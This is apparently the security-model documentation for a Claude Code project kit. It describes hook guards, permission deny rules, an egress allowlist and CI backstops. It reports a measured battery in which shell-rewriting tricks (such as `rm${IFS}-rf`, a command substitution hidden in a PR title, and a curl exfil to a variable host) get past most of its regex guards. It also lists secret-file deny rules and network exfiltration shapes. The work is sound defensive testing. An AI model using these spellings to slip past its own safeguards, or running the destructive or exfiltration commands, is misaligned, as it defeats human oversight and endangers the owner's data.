# Security Model

> **Found a vulnerability in the kit itself** (a hook bypass, a guard gap)? Please
> open a [private security advisory](https://github.com/braedensc/claude-project-kit/security/advisories/new)
> rather than a public issue.

Distilled from a production security posture (built 2026-06-23 → 2026-07-03, live
app + real API spend, zero leaks). Everything here was enforced, not aspirational.

---

## The three layers

Three **independent** enforcement layers, ordered by when they fire and whether they can
be bypassed:

| Layer | Fires when | Bypassable? | Guards against |
|---|---|---|---|
| 1. Claude Code hooks (`.claude/hooks/`) | Claude attempts a tool call | **Invocation: no. Pattern match: yes** — the harness always runs the hook, but its Bash guards match raw command text a motivated caller can respell ([measured](#what-the-pattern-guards-actually-carry)) | Claude reading a secret, `rm -rf`, staging `.env`, embedding a key, editing on `main`, **exfiltrating data to a non-allowlisted host** |
| 2. Git pre-commit (`.husky/` + secretlint) | `git commit` | Yes (`--no-verify`) | A secret value reaching a commit; forbidden paths staged; commits on `main` |
| 3. CI + branch protection | PR targets `main` | **No** — server-side on GitHub | Everything above, re-checked; the real gate |

Two principles worth keeping verbatim:

> **Layer 1 is unique to Claude Code and the reason this kit exists: it can block a tool
> call — even a *read* — so a secret never enters the model's context in the first place.**

> **CI is the real guarantee — the local layers just catch mistakes early and cheaply.**

And a third, added after the measurement below:

> **Layer 1 stops a mistake, not an adversary.** The hook always runs; what it *matches*
> is raw shell text the shell then rewrites. Read the ladder accordingly — every
> guarantee that has to survive a motivated caller is carried by layer 3 or by the OS
> sandbox, never by a regex.

**"Bypass is earned by hooks."** `.claude/settings.json` ships
`permissions.defaultMode: bypassPermissions` ONLY because layer 1 hard-blocks the
dangerous operations in every permission mode. Remove or weaken the hooks and you must
remove the bypass too — they are one decision, not two.

**The hooks protect themselves.** A guard the agent can edit is theater — Claude could
delete the block or unwire it in `settings.json` the moment it hit one. So the hook
scripts and settings are **human-only**: the PreToolUse guard blocks Edit/Write
(and Bash mutations — `>`, `sed -i`, `cp`/`mv`/`rm`, `chmod`/`chown`/`awk`,
`git checkout/restore/reset/clean/stash/apply/rm/mv`, and any `python`/`node`/`ruby`
invocation naming a protected path) targeting itself, `audit.py`, `stop-pr-check.py`,
`settings.json`, and `settings.local.json` (local settings override project scalars, so
writing them could neutralize every guard for future sessions). Changing one is a human
step — Claude composes + validates a scratch copy and prints a terminal command for you
to run. This is a first line, not a perfect sandbox (a shell can't be fully fenced by
regex); the real guarantee stays git: any change must survive a reviewed PR + CI, which
re-runs the battery against the committed hook. (Reads are always allowed; an
unresolvable target path fails closed.)

**The server-side backstop: the "Hooks change guard" CI job.** Local
self-protection constrains only sessions that run the hook — a PR authored
anywhere else (another clone, the GitHub web UI, an `@claude` workflow) never
meets it. So CI carries the merge-time layer: any PR whose diff touches
`.claude/hooks/**` or `.claude/settings*.json` fails unless it carries the
`hooks-change` label — an explicit, human-visible acknowledgment instead of a
silent merge (adding/removing the label re-runs the check via the
`labeled`/`unlabeled` PR trigger types). One dependency to know: the label only
becomes a real *gate* once branch protection also requires at least one
approving review — otherwise the PR author can self-label and merge unseen.

**Native `permissions.deny` — a layer independent of the Python hook.**
`.claude/settings.json` also carries platform deny rules
(`Read(.env)`, `Read(.env.local)`, `Read(.env.production)`, `Read(secrets/**)`,
`Read(*.pem)`, `Read(*.key)`, `Read(**/id_rsa)`, `Read(**/credentials)`, …) that
Claude Code enforces itself. This matters: per
the docs, **deny wins even under `defaultMode: bypassPermissions`**, deny beats allow
across every settings scope, and deny rules aren't gated by the workspace-trust
dialog — so secret-file reads are blocked immediately, even if the PreToolUse hook
were removed. It's belt-and-suspenders with the hook, not a replacement (deny covers
built-in Read/Edit/Grep and recognized `cat`/`head` Bash reads, but not an arbitrary
subprocess opening the file — which the hook and OS sandboxing cover). The list
deliberately **enumerates** real env-file names rather than using a `Read(.env.*)`
wildcard: the wildcard would also catch `.env.example` — the one env file that's
*meant* to be read and edited — and deny rules can't express exceptions; exotic
`.env.foo` variants are still caught by the hook layer.

**Egress: secrets can leave without ever being *read*.** The guards above stop Claude
opening a secret file; the egress guard covers the other direction — a network tool
(`curl`/`wget`/`scp`/`sftp`/`nc`) aimed at a **non-allowlisted host** *combined with* an
exfil shape (upload/data flags, `-X POST|PUT|PATCH`, an `@file` payload, a `$VAR` in the
URL's query/fragment, or any `scp`/`nc` transfer) is blocked, while plain inbound
downloads stay allowed. The allowlist matches on domain boundaries, so `evil-github.com`
does not pass as `github.com`. It is a denylist of obvious shapes, not an egress
firewall — the devcontainer/OS sandbox remains the real fence; this is the cheap layer
that catches the careless case.

### What the pattern guards actually carry

**Measured, 2026-08-26.** [GuardFall](https://labs.cloudsecurityalliance.org/research/csa-research-note-guardfall-ai-agent-shell-injection-2026070/)
(Adversa AI via the Cloud Security Alliance, June 2026) describes a class of bypasses
against pattern-based shell guards: *the guard inspects raw command text, bash rewrites
that text before executing it, and the two never see the same thing.* 10 of 11 tested
open-source coding agents fell. Claude Code was not in the tested set — which is not a
passing grade, so the kit measured itself.

The battery is `.claude/hooks/test_guard_bypass.py` (`npm run test:bypass`): 67 probes
across the six Bash pattern guards, using the published primitive classes (quote
collapsing, `$IFS` field splitting, command substitution, variable expansion, `printf`
octal + `eval`, glob expansion, line continuation). Every probe recorded as getting
through is then **executed in a sandbox whose PATH contains only inert shims**, so the
recorded argv proves the shell really did build the forbidden command — a bypass is
never just a regex that failed to match. It runs in CI as a *characterization* test: it
goes red when a recorded result changes in **either** direction, so a guard that starts
leaking and a guard that gets hardened both force the record and this section to be
updated in the same PR.

| Guard | Probes | Held | Got through | Verdict |
|---|---|---|---|---|
| `SENSITIVE_PATH_RE` (secret files) | 12 | 4 | 8 | **advisory** |
| destructive-op (`rm -rf`, `git add planning/`, push-to-`main`, `curl \| sh`) | 15 | 4 | 10 | **advisory** |
| egress / exfiltration | 10 | 4 | 6 | **advisory** |
| never-merge (`gh pr merge`) | 7 | 1 | 5 | **advisory** |
| self-approval (`gh pr review --approve`) | 12 | 7 | 4 | **advisory** |
| protected-label (`hooks-change`, `agent:*`, …) | 11 | 3 | 7 | **advisory** |

**All six are advisory against a motivated caller. None is robust.** Roughly a quarter
of the probes bounced; the rest went through, and 40 of them were shell-verified to
build the exact argv the guard was looking for.

**Threat model, stated plainly.** These guards still work against the case they were
written for: a cooperating agent that mistypes, or reaches for a dangerous command
without thinking, is caught every time — nobody writes `rm${IFS}-rf` by accident. The
exposure is the *motivated* caller, which is precisely the prompt-injection case
`docs/PIPELINE-CONTRACT.md` already takes seriously (ticket text is untrusted data).
Treat the pattern guards as a seatbelt, not a lock.

Three findings worth carrying into any future hardening:

- **Allowlists survive expansion; denylists do not.** The egress guard's *host allowlist*
  holds under variable expansion — `curl -d @f https://$H/collect` blocks, because an
  unresolved `$H` is simply not on the list. Its *exfil-shape denylist* does not hold: a
  secret in a request header or a URL path is not one of the enumerated shapes. Same
  file, same author, opposite outcomes, and the difference is the direction of the list.
- **Failing closed beats matching harder.** The self-approval guard is the best-behaved
  of the six, and not because its regexes are better: because a `gh pr review` with no
  readable event is *refused*, mangling the flag (`--appro""ve`) or splitting the line
  buys nothing. The spellings that get past it are the ones that never reach the
  fail-closed branch — mangling the command word, or moving to `curl`.
- **One root cause crosses every guard.** `_strip_prose` blanks the quoted value of
  `-m`/`--message`/`--title`/`--body`/`-t`/`-b` before any Bash guard sees it, so
  guards do not false-positive on commit prose. But bash still *evaluates command
  substitution inside that value*: `gh pr create --title "$(rm -rf build)"` is invisible
  to every matcher and runs anyway. One probe per guard confirms it.

So which layer actually carries which guarantee:

| Guarantee | Advisory (hook regex) | **Carried by** |
|---|---|---|
| Secrets are never read | `SENSITIVE_PATH_RE` | `permissions.deny` in `settings.json` (platform-enforced, not a regex over command text) + the devcontainer/OS sandbox |
| No exfiltration | egress matcher | a network policy at the sandbox boundary, which does not care how the command was spelled — see `docs/EGRESS.md` for the pipeline's, including what it does **not** cover |
| No destructive local op | `rm -rf` matcher | the blast radius being a disposable worktree; git history for anything committed |
| Nothing lands on `main` | push guard | **branch protection** (server-side, GitHub) |
| Claude never merges | `gh pr merge` matcher | **branch protection + the platform merge gate**, in repository settings, outside the repo tree |
| An approval means a human read it | `gh pr review` matcher | a **branch-protection rule that does not count a review from the PR's own author** |
| A guard change is acknowledged by a person | protected-label matcher | **`scripts/check_grader_paths.py`**, which checks *who* applied the label, server-side |

Every row's right-hand column is unreachable from a session. That is the design the
measurement argues for, and it is why the second column was never the whole story — the
never-merge, self-approval and protected-label guards were each already documented in
`pre-tool-use.py` as "a first line over command shapes, not an exhaustive denylist".
What the measurement adds is the same honesty for the other three, and numbers behind
all six.

**Not measured (out of scope, KIT-36 step 1):** the Bash arm of *self-protection*
(`_SELF_MUTATE_RE`) is built from the same regex scaffold and should be assumed to share
the weakness; its Edit/Write arm is a `realpath` comparison and does not. The guarantee
there was never the regex — it is that any hook change must survive a reviewed PR and
CI, which re-runs both batteries against the committed hook.

**The system fails closed — including when python3 itself is missing.** A
missing/broken hook *script* blocks every tool call (python exits 2 = the block
signal). A missing *interpreter* would have failed open (shell exit 127 is treated as
a non-blocking error), so the PreToolUse wiring guards it explicitly:
`command -v python3 … || exit 2` — no python3, no tools, rather than no guards.
Operationally: **create hook scripts before wiring `settings.json`** (see
docs/LESSONS.md — this kit hit both variants of that deadlock).

**The provenance guard: the "Provenance scan" CI job.** A public repo leaks personal
detail through ordinary text, not just secrets: `scripts/check_provenance.py` fails the
PR on any tracked file carrying an **absolute home path** that names a real account or a
**real-looking email**. An optional term list (`$PROVENANCE_DENYLIST`, or a git-ignored
`.provenance-denylist`) additionally forbids specific names — matched in the path as well
as the contents, and printed masked (`<term #1>`); unset, that rule silently no-ops.

Server-side extras (free, one-time toggles in GitHub → Settings → Security): secret
scanning, **push protection**, Dependabot security updates. They backstop layer 3.

### Security invariants as CI

A security rule that lives only in CLAUDE.md is advisory — the model can drift
from it and nobody is told. The pattern that held in production: **every written
security rule gets a deterministic, dependency-free CI scanner that fails when a
new surface appears without a reviewed allowlist entry.** The origin build's five
scanner jobs are the worked example — static RLS coverage, live-DB RLS proof, a
write-capability audit, a `SECURITY DEFINER` grant audit, and an edge-function
outbound-fetch allowlist — each a small script with its own tests, each job
comment citing the numbered rule it enforces. Those scripts are stack-specific
and don't ship here; the pattern does. The kit already self-hosts it (hook
battery, GuardFall bypass battery, forbidden-paths gate, placeholder integrity,
the hooks-change guard);
when you write a new security rule for your project, write the scanner that
detects its violation in the same PR.

---

## The secrets model — three ISOLATED stores

A value must be set separately in every store that needs it. **Setting one does nothing
for the others** — production deploys proved this repeatedly:

| Store | Examples | Set by | Feeds |
|---|---|---|---|
| Local env | `.env.local` (gitignored) | **Human only** — the hook blocks Claude from writing `.env*` and key-shaped values | Local dev server |
| CI secrets | GitHub → Settings → Secrets and variables → Actions | Human (`gh secret set` or dashboard) | Workflows (backup/deploy/keepalive) |
| Host env | `supabase secrets set …`, Vercel env vars | Human (CLI/dashboard) | Deployed functions / frontend build |

Rules that fall out of this:

- **Placeholders only in code.** `.env.example` (placeholder values) is the only env
  file ever committed; all three enforcement layers verify that.
- **Classify every var at birth**: *public-by-design client value* (e.g. a Supabase
  anon key — shipped in the bundle, gated by RLS) vs *server secret* (service role,
  API keys — never in any frontend file or `VITE_*`-style var). Public values may
  still live in CI Secrets purely for log-masking hygiene.
- **Human-only steps are labeled.** Docs mark dashboard/CLI secret steps "(you, in
  dashboards)" — Claude cannot and should not do them; that boundary is the design.
- **Secrets in workflows stay in `env:`** referenced as `"$VAR"` — never inline, never
  with `set -x`/`--debug`, or the value leaks into logs.
- **MCP servers that carry tokens are user-scoped, never committed.** Register them
  with `claude mcp add --scope user …` (lives in `~/.claude.json`, OAuth on first use)
  so no token or server config lands in project files; collaborators run the same
  command on their own machines (the Sentry MCP pattern).
- **Project-scoped MCP (`.mcp.json`, committed) references secrets only via `${VAR}`** —
  never hardcode a token in it (see `.mcp.json.example`). Env-var expansion (`${VAR}`,
  `${VAR:-default}`) is the supported form; a project `.mcp.json` server is also
  approval-gated on first use, so a committed config can't silently connect.
- **Autonomous/unattended runs** (`--dangerously-skip-permissions`) belong in a
  sandboxed devcontainer with an egress firewall — never on the host, never with
  `~/.ssh` mounted (`.devcontainer/README.md`).

---

## Database posture (Postgres/Supabase flavor — keep the shape for any datastore)

- **RLS deny-by-default on every table**: owner-scoped policies (`user_id = auth.uid()`
  in both `USING` and `WITH CHECK`), scoped `to authenticated`, `user_id` defaulting
  server-side. Once proven adversarially, **clone the pattern verbatim per table**.
- **No client hard-delete**: grant `select, insert, update` — never `delete` — and
  define no DELETE policy. Destruction is structurally impossible twice over (no grant
  AND no policy); the app soft-deletes (`deleted_at` UPDATE). Recovery for the common
  case never depends on backups.
- **Append-only logs**: audit/history tables get SELECT + INSERT only, denormalized
  columns, and **no FK to mutable rows** — record lifecycle and log lifecycle can never
  conflict.
- **Identity is never a parameter**: server-side functions run as the caller
  (`SECURITY INVOKER`) with the user id derived from auth context, so no caller can
  address another user's rows. Global system state (budget ledgers, caches) lives in
  tables with **no grants and no policies**, reachable only through narrow privileged
  RPCs — which is how the admin/service key stays out of application code entirely.
- **Prove it adversarially**: every policy shipped with a two-user proof (isolation,
  escalation blocked, hard-delete denied, soft-delete recoverable).

The PreToolUse hook completes the picture locally: destructive ops against a **remote**
database are blocked outright; the **local** (Docker) stack stays frictionless. Local is
disposable, production is irreplaceable.

---

## AI cost guardrails (the owner-key pattern)

For any app calling a paid AI API on the owner's key (proven in production with real
spend):

1. **Server-side-only keys.** The API key is a platform function secret, read from
   server env. Never in the bundle, never in a client-visible var, never logged. The
   hook additionally blocks writing `sk-ant-…`-shaped values into any file.
2. **CORS origin-lock — never `*`.** Functions echo the request Origin only if it's in
   the `ALLOWED_ORIGIN` allow-list; otherwise no ACAO header and the browser blocks.
   Side effect worth keeping: preview-deploy URLs don't match the allow-list, so
   previews can't spend the owner's budget.
3. **Per-user rate limits** as append-only event rows counted over trailing windows
   (e.g. chat 30/hr, 100/day) — no mutable counter to race, no cron to reset.
4. **Global monthly budget kill-switch**: a ledger (one row per month, micro-dollar
   integers) capped at a constant (e.g. $20/month). When tripped, every AI endpoint
   refuses until the next month. Check order: **budget first** (cheap, no write — don't
   charge a rate-limit unit against a paused month), then rate limit (which records).
5. **Per-call output cap** (`max_tokens` small) bounds a single call; the kill-switch
   bounds the month.
6. **Agentic tool safety**: destructive tools are a **server-side** classification the
   model can't influence; the whole turn halts until human confirmation the model can
   neither see nor forge; every DB write goes through the caller's JWT client so RLS
   bounds prompt-injection blast radius; system prompts frame user data as *data, not
   instructions*; tool loops carry a hard iteration cap.
7. **Verify model IDs and pricing against live docs** before hard-coding cost math —
   post-cutoff models/prices change. Bias the math in the *conservative* direction (a
   kill-switch that can only trip early, never late).

---

## Runbooks

**Security incident** (alert from Dependabot / secret scanning / Sentry):
1. Assess severity.
2. Let Dependabot open the fix PR (or Claude bumps it); CI runs the full gate.
3. Review → merge → deploy.
4. **If a key leak is suspected, rotate immediately** (below).

**Key rotation:** rotate at the provider dashboard first, then update every store that
holds it (Actions secret / platform secret / `.env.local` — all three are isolated, so
walk the list). For a DB password: reset at the dashboard, update the backup/deploy
connection-string secret. App-facing anon keys are public by design and need no rotation
panic — RLS is the guard.

**Backup restore:** download the encrypted artifact →
`gpg --batch --passphrase "$BACKUP_GPG_PASSPHRASE" -d backup.sql.gpg > backup.sql` →
restore into a fresh/throwaway DB → verify row counts. Prove the full round-trip once
**before** you need it.

**Schema rollback is not `git revert`:** reverting a migration file only stops it
re-applying. Run the migration's hand-written `-- down:` block against prod, remove its
row from the migrations ledger; for data-lossy changes restore the backup (take an
on-demand backup *before* risky migrations).

---

## macOS keychain norms

Working rules for CLI tools that store tokens in the macOS keychain (Supabase CLI, gh,
etc.):

- **Know what the prompt means.** "<tool> wants to access key … in your keychain" =
  a CLI reading a token it stored earlier. Expected when *you* just ran (or asked
  Claude to run) a command that authenticates.
- **Announce before keychain-reading commands.** Claude should say a keychain dialog is
  expected *before* running such a command, so the prompt is never a surprise.
- **"Always Allow" is per-binary-signature.** Fine for tools you trust; note that a
  `brew upgrade` produces a new binary, so the keychain will re-prompt — expected, not
  suspicious (docs/LESSONS.md).
- **Never type your login password into a dialog you didn't expect.** If a keychain
  prompt appears with no command you can attribute it to, deny it and investigate.
